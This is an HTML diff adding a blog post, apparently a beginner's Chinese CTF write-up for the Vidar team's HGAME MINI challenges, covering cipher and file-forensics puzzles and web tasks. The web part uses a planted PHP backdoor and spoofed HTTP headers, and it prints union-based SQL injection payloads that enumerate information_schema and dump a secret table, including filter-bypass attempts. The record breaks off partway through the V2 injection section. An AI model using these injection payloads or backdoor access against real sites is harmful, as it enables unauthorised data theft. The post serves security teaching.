@@ -1,0 +1,1829 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag (contains Google-Analytics、Baidu-Tongji)-->
+<head>
+  <!-- Google Analytics -->
+  
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async="async" src="https://www.googletagmanager.com/gtag/js?id=UA-xxxxxx-xx"></script>
+    <script type="text/javascript">
+      window.dataLayer = window.dataLayer || [];
+
+      function gtag() {
+        dataLayer.push(arguments);
+      }
+      gtag('js', new Date());
+
+      gtag('config', 'UA-xxxxxx-xx');
+    </script>
+  
+
+  <!-- Baidu Tongji -->
+  
+    <script type="text/javascript">
+      // Originial
+      var _hmt = _hmt || [];
+      (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+      })();
+    </script>
+  
+
+  <!-- Baidu Push -->
+  
+    <script>
+      (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+      })();
+    </script>
+  
+
+  <meta charset="utf-8"/>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+
+  <meta name="google-site-verification" content="lxDfCplOZbIzjhG34NuQBgu2gdyRlAtMB4utP5AgEBc"/>
+  <meta name="baidu-site-verification" content="PpzM9WxOJU"/>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <meta name="description" content="It&#39;s a personal blog..."/>
+  <meta name="keyword" content="JBNRZ, CTF, blog"/>
+  <link rel="shortcut icon" href="/img/avatar/lovelydog.jpg"/>
+
+  <!-- Place this tag in your head or just before your close body tag. -->
+  <script async="async" defer="defer" src="https://buttons.github.io/buttons.js"></script>
+
+  
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css"/>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/beantech.min.css"/>
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css"/>
+    <link rel="stylesheet" href="/css/widget.css"/>
+    <link rel="stylesheet" href="/css/rocket.css"/>
+    <link rel="stylesheet" href="/css/signature.css"/>
+    <link rel="stylesheet" href="/css/catalog.css"/>
+    <link rel="stylesheet" href="/css/livemylife.css"/>
+
+    
+      <!-- wave start -->
+      <link rel="stylesheet" href="/css/wave.css"/>
+      <!-- wave end -->
+    
+
+    
+      <!-- top start (article top hot config) -->
+      <link rel="stylesheet" href="/css/top.css"/>
+      <!-- top end -->
+    
+
+    
+      <!-- ThemeColor start -->
+      <link rel="stylesheet" href="/css/scroll.css"/>
+      <!-- ThemeColor end -->
+    
+
+    
+      <!-- viewer start (Picture preview) -->
+      <link rel="stylesheet" href="/css/viewer.min.css"/>
+      <!-- viewer end -->
+    
+
+    
+      <!-- Search start -->
+      <link rel="stylesheet" href="/css/search.css"/>
+      <!-- Search end -->
+    
+
+    
+      <!-- ThemeColor start -->
+      <link rel="stylesheet" href="/css/themecolor.css"/>
+      <!-- ThemeColor end -->
+    
+
+    
+
+    
+  
+
+  <!-- Custom Fonts -->
+  <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+  <!-- Hux change font-awesome CDN to qiniu -->
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" type="text/css">
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+
+  <!-- Hux Delete, sad but pending in China <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'> <link
+  href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/ css'> -->
+
+  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+  <!--[if lt IE 9]> <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script> <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script> <![endif]-->
+
+  <!-- ga & ba script hoook -->
+  <link rel="canonical" href="https://jbnrz.github.io/cn/Vidar/">
+  <title>
+    
+      HGAME MINI - Welcome to my blog
+    
+  </title>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<!-- hack iOS CSS :active style -->
+
+	<body ontouchstart="" class="body--light body--dark">
+
+
+		<!-- ThemeColor -->
+		
+		<!-- ThemeColor -->
+<style type="text/css">
+  .body--light {
+    --light-mode: none;
+    --dark-mode: block;
+  }
+  .body--dark {
+    --light-mode: block;
+    --dark-mode: none;
+  }
+  i.mdui-icon.material-icons.light-mode {
+    display: var(--light-mode);
+  }
+  i.mdui-icon.material-icons.dark-mode {
+    display: var(--dark-mode);
+  }
+</style>
+<div class="toggle" onclick="document.body.classList.toggle('body--dark')">
+  <i class="mdui-icon material-icons light-mode"></i>
+  <i class="mdui-icon material-icons dark-mode"></i>
+</div>
+<script>
+  //getCookieValue
+  function getCookieValue(a) {
+    var b = document.cookie.match('(^|[^;]+)\\s*' + a + '\\s*=\\s*([^;]+)');
+    return b
+      ? b.pop()
+      : '';
+  }
+  let themeMode = 'dark';
+  if (getCookieValue('sb-color-mode') && (getCookieValue('sb-color-mode') !== themeMode)) {
+    let dbody = document.body.classList;
+    themeMode === 'dark' ? dbody.remove('body--dark') : dbody.add('body--dark');
+  }
+
+  //setCookieValue
+  var toggleBtn = document.querySelector(".toggle");
+  toggleBtn.addEventListener("click", function () {
+    var e = document.body.classList.contains("body--dark");
+    var cookieString = e
+      ? "dark"
+      : "light";
+    var exp = new Date();
+    exp.setTime(exp.getTime() + 3 * 24 * 60 * 60 * 1000); //3天过期
+    document.cookie = "sb-color-mode=" + cookieString + ";expires=" + exp.toGMTString() + ";path=/";
+  });
+</script>
+
+		
+
+		<!-- Gitter -->
+		
+		<!-- Gitter -->
+<!-- Docs:https://gitter.im/?utm_source=left-menu-logo -->
+<script>
+  ((window.gitter = {}).chat = {}).options = {
+    room: 'JBNRZ/community'
+  };
+</script>
+<script src="https://sidecar.gitter.im/dist/sidecar.v1.js" async defer></script>
+
+		
+
+		<!-- Navigation (contains search)-->
+		<!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+  <div class="container-fluid">
+    <!-- Brand and toggle get grouped for better mobile display -->
+    <div class="navbar-header page-scroll">
+      <button type="button" class="navbar-toggle">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="/">Welcome</a>
+    </div>
+
+    <!-- Collect the nav links, forms, and other content for toggling -->
+    <!-- Known Issue, found by Hux: <nav>'s height woule be hold on by its content. so, when navbar scale out, the <nav> will cover tags. also mask any touch event of tags, unfortunately. -->
+    <div id="huxblog_navbar">
+      <div class="navbar-collapse">
+        <ul class="nav navbar-nav navbar-right">
+          <li>
+            <a href="/">首页</a>
+          </li>
+
+          
+          
+          
+          
+          <li>
+            <a href="/categories/">
+              
+              分类
+              
+              
+            </a>
+          </li>
+          
+          
+          
+          <li>
+            <a href="/about/">
+              
+              关于
+              
+              
+            </a>
+          </li>
+          
+          
+          
+          <li>
+            <a href="/archive/">
+              
+              归档
+              
+              
+            </a>
+          </li>
+          
+          
+          
+          <li>
+            <a href="/tags/">
+              
+              标签
+              
+              
+            </a>
+          </li>
+          
+          
+
+          
+          <li>
+            <a class="popup-trigger">
+              <span class="search-icon"></span>搜索</a>
+          </li>
+          
+
+          <!-- LangSelect -->
+          
+        </ul>
+      </div>
+    </div>
+    <!-- /.navbar-collapse -->
+  </div>
+  <!-- /.container -->
+</nav>
+<!-- progress -->
+<div id="progress">
+  <div class="line" style="width: 0%;"></div>
+</div>
+
+<script>
+  // Drop Bootstarp low-performance Navbar Use customize navbar with high-quality material design animation in high-perf jank-free CSS3 implementation
+  var $body = document.body;
+  var $toggle = document.querySelector('.navbar-toggle');
+  var $navbar = document.querySelector('#huxblog_navbar');
+  var $collapse = document.querySelector('.navbar-collapse');
+
+  $toggle.addEventListener('click', handleMagic)
+
+  function handleMagic(e) {
+    if ($navbar.className.indexOf('in') > 0) {
+      // CLOSE
+      $navbar.className = " ";
+      // wait until animation end.
+      setTimeout(function() {
+        // prevent frequently toggle
+        if ($navbar.className.indexOf('in') < 0) {
+          $collapse.style.height = "0px"
+        }
+      }, 400)
+    } else {
+      // OPEN
+      $collapse.style.height = "auto"
+      $navbar.className += " in";
+    }
+  }
+</script>
+
+
+		<!-- Post Header (contains intro-header、signature、wordcount、busuanzi、waveoverlay) -->
+		<!-- Modified by Yu-Hsuan Yen -->
+<!-- Post Header -->
+
+  <style type="text/css">
+    .body--light {
+      /* intro-header */
+      --intro-header-background-image-url-home: url('/img/header_img/1.jpg');
+      --intro-header-background-image-url-post: url('/img/header_img/vidar.png');
+      --intro-header-background-image-url-page: url('//img/header_img/vidar.png');
+    }
+    .body--dark {
+      --intro-header-background-image-url-home: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/img/header_img/1.jpg');
+      --intro-header-background-image-url-post: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/img/header_img/vidar.png');
+      --intro-header-background-image-url-page: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('//img/header_img/vidar.png');
+    }
+
+    header.intro-header {
+       /*post*/
+        background-image: var(--intro-header-background-image-url-post);
+        /* background-image: url('/img/header_img/vidar.png'); */
+      
+    }
+
+    
+      #signature {/*signature*/
+        background-image: url('/img/signature/jbnrz.png');
+      }
+    
+  </style>
+
+
+
+
+
+<header class="intro-header">
+  <!-- Signature -->
+  <div id="signature">
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+          
+          <div class="post-heading">
+            <div class="tags">
+              
+              <a class="tag" href="/tags/#Vidar" title="Vidar">Vidar</a>
+              
+              <a class="tag" href="/tags/#easy" title="easy">easy</a>
+              
+            </div>
+            <h1>HGAME MINI</h1>
+            <h2 class="subheading">A lot of easy problem</h2>
+            <span class="meta">
+              Posted by JBNRZ on
+              2022-09-13
+            </span>
+
+
+            
+            <!-- WordCount start -->
+            <div class="blank_box"></div>
+            <span class="meta">
+              Estimated Reading Time <span class="post-count">17</span> Minutes
+            </span>
+            <div class="blank_box"></div>
+            <span class="meta">
+              Words <span class="post-count">3.7k</span> In Total
+            </span>
+            <div class="blank_box"></div>
+            <!-- WordCount end -->
+            
+            
+            <!-- 不蒜子统计 start -->
+            <span class="meta" id="busuanzi_container_page_pv">
+              Viewed <span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span> Times
+            </span>
+            <!-- 不蒜子统计 end -->
+            
+
+
+          </div>
+          
+        </div>
+      </div>
+    </div>
+  </div>
+
+  
+  <!-- waveoverlay start -->
+  <div class="preview-overlay">
+    <svg class="preview-waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+      <defs>
+        <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path>
+      </defs>
+      <g class="preview-parallax">
+        <use xlink:href="#gentle-wave" x="48" y="0" fill=var(--gentle-wave1)></use>
+        <use xlink:href="#gentle-wave" x="48" y="3" fill=var(--gentle-wave2)></use>
+        <use xlink:href="#gentle-wave" x="48" y="5" fill=var(--gentle-wave3)></use>
+        <use xlink:href="#gentle-wave" x="48" y="7" fill=var(--gentle-wave)></use>
+      </g>
+    </svg>
+  </div>
+  <!-- waveoverlay end -->
+  
+
+</header>
+
+
+
+		<!-- Main Content (Post contains
+	Pager、
+	tip、
+	socialshare、
+	gitalk、gitment、disqus-comment、
+	Catalog、
+	Sidebar、
+	Featured-Tags、
+	Friends Blog、
+	anchorjs、
+	) -->
+		<!-- Modify by Yu-Hsuan Yen -->
+<!-- Post Content -->
+<article>
+  <div class="container">
+    <div class="row">
+      <!-- Post Container -->
+      <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
+
+        <blockquote>
+<p>刚开学时 <code>Vidar</code> 的题目，我能做出来的几乎都会给出 wp ，个别太简单的就不放了<br>
+（虽然放上来的也都很简单，但是刚入门，不慌~~<br>
+涉及到的网址都是随机容器，不能访问</p>
+</blockquote>
+<h1>Misc</h1>
+<h2 id="Ekrulila’s-picture">Ekrulila’s picture</h2>
+<h3 id="题解">题解</h3>
+<ol>
+<li>看题目描述，嘶，不知道是谁<br>
+<img src="Ekrulila%E2%80%99s_picture.jpg" alt="Ekrulila’s picture"></li>
+<li>两个 <code>Hint</code> :</li>
+</ol>
+<blockquote>
+<p>看！那有一排鸟在电线上诶<br>
+或许可以试试英文搜索？</p>
+</blockquote>
+<ol start="3">
+<li>听话，去网上搜</li>
+</ol>
+<blockquote>
+<p>第一个拦住我的地方出现了，不要在国内搜！！！</p>
+</blockquote>
+<ol start="4">
+<li>打开 <code>bing</code> ，搜索<code>birds on the wire cipher</code>，发现了个网址：</li>
+</ol>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.dcode.fr/birds-on-a-wire-cipher#:~:text=The%20encryption%20composed%20of%20birds%20represented%20as%20perched,from%20A%20to%20Z%29%20according%20to%20the%20correspondence%3A">https://www.dcode.fr/birds-on-a-wire-cipher#:~:text=The encryption composed of birds represented as perched,from A to Z) according to the correspondence%3A</a></p>
+</blockquote>
+<ol start="5">
+<li>解码</li>
+</ol>
+<blockquote>
+<p>HOWBEAUTIFULBIRDS</p>
+</blockquote>
+<ol start="6">
+<li>得flag：</li>
+</ol>
+<blockquote>
+<p>VIDAR{HOWBEAUTIFULBIRDS}</p>
+</blockquote>
+<h2 id="Weird-suffix">Weird suffix</h2>
+<h3 id="题目描述">题目描述</h3>
+<p>I have a big doubt about file extensions.</p>
+<h3 id="题解-2">题解</h3>
+<ol>
+<li>根据题目描述，猜测和文件类型有关</li>
+<li>下载附件，得到三个 txt 文本</li>
+<li>打开查看，发现分别是 png, jpg, bmp 三种文件头</li>
+<li>修改后缀</li>
+<li>得 flag</li>
+</ol>
+<blockquote>
+<p>VIDAR{FunNy_su4fix}</p>
+</blockquote>
+<h2 id="Hidden-Zip">Hidden Zip</h2>
+<h3 id="题目描述-2">题目描述</h3>
+<p>010Editor may help you to find something strange！</p>
+<h3 id="Hints">Hints</h3>
+<p>Fence code</p>
+<h3 id="题解-3">题解</h3>
+<ol>
+<li>解压得到一张图片<br>
+<img src="Genshin.jpg" alt="Hidden Zip"></li>
+<li>根据题目描述，用 010editor 打开</li>
+<li>查看发现结尾存在 zip 内容</li>
+<li>修改文件后缀名，解压</li>
+<li>打开发现是加密过的 flag</li>
+<li>看出或是根据 hint 得出是 栅栏密码</li>
+<li>解密得到 Flag</li>
+</ol>
+<blockquote>
+<p>VIDAR{Wow~_Y0u_find_Me!}</p>
+</blockquote>
+<h2 id="Twisted-figures">Twisted figures</h2>
+<h3 id="题目描述-3">题目描述</h3>
+<p>Twisted png and get flag picture!</p>
+<h3 id="Hints-2">Hints</h3>
+<p>The results from OCR may need to be easily corrected by themselves.</p>
+<h3 id="题解-4">题解</h3>
+<ol>
+<li>解压得到一张图片，明显是被修改过长或宽<br>
+<img src="twisted_figures_t.png" alt="Twisted figures"></li>
+<li>使用 python 编写脚本，通过 CRC 值爆破正常宽度</li>
+</ol>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">import</span> binascii</span><br><span class="line"><span class="attribute">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="attribute">misc</span> = open(<span class="string">&quot;twisted_figures.png&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="attribute">for</span> i in range(<span class="number">1024</span>):</span><br><span class="line">    <span class="attribute">data</span> = misc[<span class="number">12</span>:<span class="number">16</span>] + struct.pack(&#x27;&gt;i&#x27;, i) + misc[<span class="number">20</span>:<span class="number">29</span>]</span><br><span class="line">    <span class="attribute">crc32</span> = binascii.crc<span class="number">32</span>(data) &amp; <span class="number">0</span>xffffffff</span><br><span class="line">    <span class="attribute">if</span> crc<span class="number">32</span> == <span class="number">0</span>xCC<span class="number">64</span>E<span class="number">9</span>C<span class="number">9</span>:</span><br><span class="line">        <span class="attribute">print</span>(i)</span><br><span class="line">        <span class="attribute">print</span>(<span class="string">&quot;hex:&quot;</span> + hex(i))</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>得到宽度应为 640，使用 010 进行修改，得到正常图片<br>
+<img src="twisted_figures-2.png" alt="Twisted figures2"></li>
+<li>打开图片发现是一堆16进制文字，发现开头为 <code>89 50 4E 47</code>，为 png 文件头</li>
+<li>使用 OCR 转换文字，（QQ 文字识别）得到 16 进制数据</li>
+</ol>
+<blockquote>
+<p>注意修改其中的__错误字符__, OCR 识别不准确<br>
+排除 空格</p>
+</blockquote>
+<ol start="6">
+<li>导入至 010 中，保存为 .png 文件</li>
+<li>打开文件，得到 flag<br>
+<img src="Twisted_figures_flag.png" alt="Twisted figures flag"></li>
+</ol>
+<blockquote>
+<p>VIDAR{Ocr_c4n_b1_Us4fu1!}</p>
+</blockquote>
+<h2 id="Hard-zip">Hard zip</h2>
+<h3 id="题目描述-4">题目描述</h3>
+<p>ek1ng admired E99p1ant, the senior of Vidar-Team who wrote cardinal, so he hid what he wanted to say to E99p1ant in the compressed package.</p>
+<h3 id="题解-5">题解</h3>
+<ol>
+<li>下载附件，一个压缩包</li>
+<li>尝试弱口令密码，发现 password 为解压密码（只能说运气好，出题人原本目的是需要爆破口令</li>
+<li>解压得到一张照片<br>
+<img src="hard_zip.png" alt="hard zip"></li>
+<li>010 打开查看 16 进制数据，发现文件后部有大量 16进制数据，并且数据头部为 zip 文件头，复制出来</li>
+<li>新建 16进制文件，导入数据，保存为 .zip</li>
+<li>得到四个部分，可以看出是二维码<br>
+<img src="hard_zip_part1.png" alt="hard zip 1"><br>
+<img src="hard_zip_part2.png" alt="hard zip 2"><br>
+<img src="hard_zip_part3.png" alt="hard zip 3"><br>
+<img src="hard_zip_part4.png" alt="hard zip 4"></li>
+<li>使用 ps 拼接，扫码得到 flag</li>
+</ol>
+<blockquote>
+<p>VIDAR{U^kn0w_QRCode}</p>
+</blockquote>
+<h2 id="Adventure-of-the-Dancing-Men">Adventure of the Dancing Men</h2>
+<h3 id="题目描述-5">题目描述</h3>
+<p>What one man can invent, another can discover.</p>
+<h3 id="Hints-3">Hints:</h3>
+<ol>
+<li>Base不只有Base64</li>
+<li>题目采用的密码表：<a target="_blank" rel="noopener" href="https://codepen.io/anie116/full/jdzvJK">https://codepen.io/anie116/full/jdzvJK</a></li>
+</ol>
+<h3 id="题解-6">题解</h3>
+<ol>
+<li>根据题目描述，发现和福尔摩斯小说《跳舞的人》有关</li>
+<li>下载附件<br>
+<img src="Adventure_of_the_Dancing_Men.png" alt="Adventure of the Dancing Men"></li>
+<li>扫描二维码得到一串儿摩尔斯密码</li>
+</ol>
+<blockquote>
+<p>— …- - .-- — -.-- …-- --. … … -…- … -… --… .-. … …-. --… …- .-- . -… .-… .-- …-. --… --.- -…- . --… --… .–. --. … -.-- -… . – .-. .–. --. .- …- … -… – .— … …-. … .-. .-- … --… .-… — --. … … …- --. -. -.-. -. .–. -… -… …-. — …-- -… -… -. …- -…- --. --. -.-- .-… …-</p>
+</blockquote>
+<ol start="4">
+<li>解密得</li>
+</ol>
+<blockquote>
+<p>OVTWOY3GHIXS6ZRSFZ4WE6LWFZQXEZZPGIYDEMRPGA4S6MJSF5RWIZLOG5IVGNCNPBBFO3DBNUXGGYLU</p>
+</blockquote>
+<ol start="5">
+<li>根据 hint 提示，为 base家族 其他加密方式，经过尝试，为 base32 加密</li>
+</ol>
+<blockquote>
+<p>uggcf://f2.ybyv.arg/2022/09/12/cden7QS4MxBWlam.cat</p>
+</blockquote>
+<ol start="6">
+<li>长得很像网址，应该是凯撒加密，解密得：</li>
+</ol>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://s2.loli.net/2022/09/12/pqra7DF4ZkOJynz.png">https://s2.loli.net/2022/09/12/pqra7DF4ZkOJynz.png</a></p>
+</blockquote>
+<ol start="7">
+<li>得到图片<br>
+<img src="dance_man_encode.png" alt="dance_man_encode"></li>
+<li>根据题目给出的网址解密得 flag</li>
+</ol>
+<blockquote>
+<p>VIDAR{…AreSoFunnnnnnnnnnnnn}<br>
+‘…’ 这块儿我忘了，懒得再去找不同</p>
+</blockquote>
+<h1>Web</h1>
+<h2 id="Do-you-really-understand-HTTP">Do you really understand HTTP</h2>
+<h3 id="题目描述-6">题目描述</h3>
+<p>ek1ng hid his secret on the page, but because he was afraid that he would forget where the secret was, he left a lot of tips. Can you find ek1ng’s secret step by step according to the tips?</p>
+<h3 id="Hints-4">Hints:</h3>
+<p>关于HTTP Header的知识看看看看这篇文章https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers</p>
+<h3 id="题解-7">题解</h3>
+<ol>
+<li>打开链接<br>
+<img src="do_you_know_http.png" alt="do you know http"></li>
+<li>明显需要加入请求头参数，使用 Burpsuite 改参<br>
+<img src="do_you_know_http_2.png" alt="do you know http 2"><br>
+<img src="do_you_know_http_10.png" alt="do you know http 10"></li>
+<li>再次修改包，修改 User-Agent<br>
+<img src="do_you_know_http_3.png" alt="do you know http 3"><br>
+<img src="do_you_know_http_4.png" alt="do you know http 4"></li>
+<li>再次修改包，添加 X-Forwarded-For<br>
+<img src="do_you_know_http_5.png" alt="do you know http 5"><br>
+<img src="do_you_know_http_6.png" alt="do you know http 6"></li>
+<li>修改 cookie， user=admin<br>
+<img src="do_you_know_http_7.png" alt="do you know http 7"><br>
+<img src="do_you_know_http_8.png" alt="do you know http 8"></li>
+<li>查看响应头，发现 flag<br>
+<img src="do_you_know_http_9.png" alt="do you know http 9"></li>
+</ol>
+<blockquote>
+<p>VIDAR{HTTP_1s^re4lly$1nteresting}</p>
+</blockquote>
+<h2 id="The-Knife">The Knife</h2>
+<h3 id="题目描述-7">题目描述</h3>
+<p>R1esbyfe hid his password on the website, but one day hackers hacked into his website and got his password, so R1esbyfe could only change his password and fix the website vulnerability. But did the hackers really leave no back door?</p>
+<h3 id="题解-8">题解</h3>
+<ol>
+<li>打开网页，也不知道要干啥，看源代码，发现 hints<br>
+<img src="knife_1.png" alt="knife1"></li>
+<li>扫一下目录<br>
+<img src="knife_2.png" alt="knife2"></li>
+<li>访问一下 back_door.php<br>
+<img src="knife_3.png" alt="knife3"></li>
+<li>上中国剑蚁<br>
+<img src="knife_4.png" alt="knife4"></li>
+<li>翻目录，找到 flag<br>
+<img src="knife_5.png" alt="knife5"><br>
+<img src="knife_6.png" alt="knife6"></li>
+</ol>
+<blockquote>
+<p>VIDAR{G5T_the_R1ghtdir!ANdH4cKTH3bacKdOOR_You_Get_The_rigH7Sh5LL!!!}</p>
+</blockquote>
+<h2 id="watch-carefully">watch carefully</h2>
+<h3 id="题目描述-8">题目描述</h3>
+<p>Someone always calls Vidar as Vider? Get on the UFO and teach them a lesson! ! !</p>
+<ol>
+<li>猜测改包，打开后观察源码，发现需要上传格式为图片<br>
+<img src="watch_carefully_1.png" alt="watch carefully 1"></li>
+<li>随便上传一张照片，使用 Burpsuite 拦截数据包，发现参数<br>
+<img src="watch_carefully_2.png" alt="watch carefully 2"></li>
+<li>结合题目信息，应该是需要将 Vider 修改为 Vidar</li>
+<li>forward 之后，发现页面下方出现了一些文字，打开代码审查<br>
+<img src="watch_carefully_3.png" alt="watch carefully 3"></li>
+<li>猜测为凯撒加密，解密得到</li>
+</ol>
+<blockquote>
+<p>bad image file!</p>
+</blockquote>
+<ol start="6">
+<li>检查问题，发现 flag 其实已经在 response 中给出</li>
+</ol>
+<blockquote>
+<p>VIDAR{W@tch CaRefu11y}</p>
+</blockquote>
+<h2 id="Get-Post-Universe">Get Post Universe</h2>
+<h3 id="题目描述-9">题目描述</h3>
+<p>One day, R1esbyfe wants to buy a GPU in an online shop, he need to transfer money to the card to buy it, but it seems a little diffcult for him, can you help him?</p>
+<h3 id="题解-9">题解</h3>
+<ol>
+<li>根据题目描述，需要 get post 两种请求方式</li>
+<li>get: <a target="_blank" rel="noopener" href="http://1-vidar-train-docker.xn--sxa.cc:49520/?money=10000">http://1-vidar-train-docker.η.cc:49520/?money=10000</a><br>
+<img src="get_post_1.png" alt="get post 1"></li>
+<li>post 利用 hackbar 添加参数，也可以写脚本<br>
+<img src="get_post_2.png" alt="get post 2"><br>
+<img src="get_post_3.png" alt="get post 3"></li>
+<li>得到 flag</li>
+</ol>
+<blockquote>
+<p>VIDAR{N0w_Y0u_hav5_LearNed_AB0u7_GET_4nD_POST!!!}</p>
+</blockquote>
+<h2 id="Book-Management-System">Book Management System</h2>
+<h3 id="题目描述-10">题目描述</h3>
+<p>ek1ng build a Book Management System in his website, everything seems ready, so that he can enter ID data to find book data, but it seems that somebody can also enter some other data?</p>
+<h3 id="题解-10">题解</h3>
+<ol>
+<li>初步判断需要进行 sql注入</li>
+<li>尝试访问 /books/1’<br>
+<img src="sql_11.png" alt="sql 11"></li>
+<li>报错，添加注释符：<code>-- </code>(注意有空格)，此题似乎过滤了 + ，改用 %20，然后报错消失<br>
+<img src="sql_12.png" alt="sql 11"></li>
+<li>获取有几列数据，通过 order by 注入</li>
+</ol>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://1-vidar-train-docker.xn--sxa.cc:49521/books/1">http://1-vidar-train-docker.η.cc:49521/books/1</a>’ order by {num}–%20<br>
+<img src="sql_13.png" alt="sql 11"><br>
+<img src="sql_14.png" alt="sql 11"></p>
+</blockquote>
+<ol start="5">
+<li>通过联合注入获取数据（想要获取数据，需要将联合注入的左半部分为 false，所以将 1 改为 -1</li>
+<li>爆数据库名， 得到 book</li>
+</ol>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://1-vidar-train-docker.xn--sxa.cc:49521/books/-1">http://1-vidar-train-docker.η.cc:49521/books/-1</a>’ union select 1,database(),3 --%20<br>
+<img src="sql_15.png" alt="sql 11"></p>
+</blockquote>
+<ol start="7">
+<li>爆表名，发现 secret 列</li>
+</ol>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://1-vidar-train-docker.xn--sxa.cc:49521/books/-1">http://1-vidar-train-docker.η.cc:49521/books/-1</a>’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=‘book’ --%20<br>
+<img src="sql_16.png" alt="sql 11"></p>
+</blockquote>
+<ol start="8">
+<li>爆 secret 的所有字段，得到 fl4g</li>
+</ol>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://1-vidar-train-docker.xn--sxa.cc:49521/books/-1">http://1-vidar-train-docker.η.cc:49521/books/-1</a>’ union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=‘book’ and table_name=‘secret’–%20<br>
+<img src="sql_17.png" alt="sql 11"></p>
+</blockquote>
+<ol start="9">
+<li>获取该字段值</li>
+</ol>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://1-vidar-train-docker.xn--sxa.cc:49521/books/-1">http://1-vidar-train-docker.η.cc:49521/books/-1</a>’ union select 1,group_concat(fl4g),3 from book.secret–%20<br>
+<img src="sql_18.png" alt="sql 11"></p>
+</blockquote>
+<ol start="10">
+<li>得到 flag</li>
+</ol>
+<blockquote>
+<p>VIDAR{i^Learned_Sql$Inject1on}</p>
+</blockquote>
+<h3 id="备注：注入">备注：注入</h3>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://vidar-team.feishu.cn/docx/doxcnlBu6zBZWkzfRcX78hv8DNS">https://vidar-team.feishu.cn/docx/doxcnlBu6zBZWkzfRcX78hv8DNS</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/281586.html#h2-8">https://www.freebuf.com/articles/web/281586.html#h2-8</a></li>
+</ol>
+<h2 id="Book-Management-System-V2">Book Management System V2</h2>
+<h3 id="题目描述-11">题目描述</h3>
+<p>After ek1ng’s book management system was hacked, he learned SQL injection and added filtering.Can you hack it?</p>
+<h3 id="题解-11">题解</h3>
+<ol>
+<li>和上一个一样，先访问 books/1’<br>
+<img src="sql_21.png" alt="sql 21"></li>
+<li>尝试加上注释，让报错消失<br>
+<img src="sql_22.png" alt="sql 22"></li>
+<li>淦！被嘲讽了，猜测可能是过滤了 <code>--</code>，改用 <code>#</code> ,但是需要进行编码：<code>%23</code><br>
+<img src="sql_23.png" alt="sql 23"></li>
+<li>嗯，没问题，确实被过滤了，继续之前的步骤。通过 <code>order by</code> 查列数<br>
+<img src="sql_24.png" alt="sql 24"></li>
+<li>淦！梅开二度，通过一系列方式尝试绕过<br>
+<img src="sql_25.png" alt="sql 25"><br>
+<img src="sql_26.png" alt="sql 26"><br>
+<img src="sql_27.png" alt="sql 27"></li>
